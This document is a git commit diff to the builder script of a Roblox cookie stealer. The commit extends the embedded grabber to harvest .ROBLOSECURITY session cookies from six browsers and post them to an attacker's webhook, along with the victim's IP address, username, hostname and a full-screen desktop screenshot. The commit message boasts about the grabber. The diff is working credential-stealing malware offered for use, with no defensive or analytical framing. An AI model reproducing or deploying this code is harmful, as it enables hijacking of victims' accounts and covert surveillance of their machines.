902c879bc9a8d7263f7aaab8272e7acea9f025f7
yTax <65450189+yTax@users.noreply.github.com>
2022-09-11 00:46:54 +0100

    made this shit grab from all browsers
    ayo i made this shit grab from all browsers, nice grabber btw

--- Builder.py
+++ Builder.py
@@ -81,31 +81,94 @@ import os
 import requests
 import socket
 from PIL import ImageGrab
+
 u = os.getlogin()
 webhook = "webhooks"
 hostname = socket.gethostname()   
 pc_username = os.getenv("UserName")
 ip = socket.gethostbyname(hostname)  
-RobloxCookie = []
-robloxcookies = browser_cookie3.edge(domain_name="roblox.com")
-for robloxcookie in robloxcookies:
-   if robloxcookie.name == ".ROBLOSECURITY":
-    RobloxCookie.append(robloxcookies)
-    RobloxCookie.append(robloxcookie.value)
 
-cookie = RobloxCookie[1]
+def cookieGrabber(): # ¯\_(ツ)_/¯  !!ytax was here!! ^-^
+
+    bobux = [] 
+
+    try:
+        cookies = browser_cookie3.chromium(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                bobux.append(cookies)
+                bobux.append(cookie.value)
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.brave(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                bobux.append(cookies)
+                bobux.append(cookie.value)
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                bobux.append(cookies)
+                bobux.append(cookie.value)
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                bobux.append(cookies)
+                bobux.append(cookie.value)
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                bobux.append(cookies)
+                bobux.append(cookie.value)
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                bobux.append(cookies)
+                bobux.append(cookie.value)
+    except:
+        pass
+    return bobux
+    
+
+
+
+        
+
+cock = cookieGrabber()
+boblox = ['_|WARNING'] 
+cock[:] = [url for url in cock if any(sub in url for sub in boblox)]
+
+for rosex in cock:
+    requests.post(webhook,json={'content': f'There Roblox Cookie:\n```{rosex}```'})
 requests.post(webhook,json={'content': f' @everyone Someone Ran The File: '})
 requests.post(webhook,json={'content': f'There Ip Is: {ip}'})
 requests.post(webhook,json={'content': f'There PC Username Is: {pc_username}'})
 requests.post(webhook,json={'content': f'There Pc Name Is:{hostname}'})
-requests.post(webhook,json={'content': f'There Roblox Cookie:{cookie}'})
+
 screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
 screenshot.save("image.jpg")
 screenshot.close()
 with open('image.jpg', 'rb') as f:
   requests.post(webhook,json={'content': f'Picture Of There Desktop:'})
   requests.post(webhook,files={'upload_file': f})
-
 """
 file = open(f'{name}.py', 'a')
 file.write(code.replace("webhooks", webhook))
